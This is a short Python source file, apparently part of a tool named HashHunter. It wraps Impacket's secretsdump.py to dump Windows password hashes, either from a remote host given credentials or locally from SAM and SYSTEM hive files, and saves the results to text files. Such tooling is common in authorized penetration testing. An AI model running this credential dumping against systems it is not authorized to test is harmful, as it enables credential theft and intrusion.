import os
import subprocess

SECRETSDUMP_PATH = os.path.expanduser("~/HashHunter/lib/impacket/examples/secretsdump.py")

def extract_from_remote(target_ip, username, password, output_file='remote_hashes.txt'):
    try:
        print(f"[+] Connecting to {target_ip} with {username}...")

        # Build secretsdump command
        command = [
            "python3",
            SECRETSDUMP_PATH,
            f"{username}:{password}@{target_ip}"
        ]

        # Run the command and capture output
        result = subprocess.run(command, capture_output=True, text=True)

        # Check for errors
        if result.returncode != 0:
            print("[!] secretsdump failed:")
            print(result.stderr)
            return

        # Save output to file
        with open(output_file, "w") as f:
            f.write(result.stdout)

        print(f"[+] Hashes saved to {output_file}")

    except Exception as e:
        print(f"[!] Error in extract_from_remote: {e}")

def extract_from_sam_system(sam_path, system_path, output_file='local_hashes.txt'):
    try:
        print(f"[+] Extracting from SAM: {sam_path}")
        print(f"[+] Extracting from SYSTEM: {system_path}")

        command = [
            "python3",
            SECRETSDUMP_PATH,
            "-sam", sam_path,
            "-system", system_path,
            "LOCAL"
        ]

        result = subprocess.run(command, capture_output=True, text=True)

        if result.returncode != 0:
            print("[!] secretsdump failed:")
            print(result.stderr)
            return

        with open(output_file, "w") as f:
            f.write(result.stdout)

        print(f"[+] Hashes saved to {output_file}")

    except Exception as e:
        print(f"[!] Error in extract_from_sam_system: {e}")
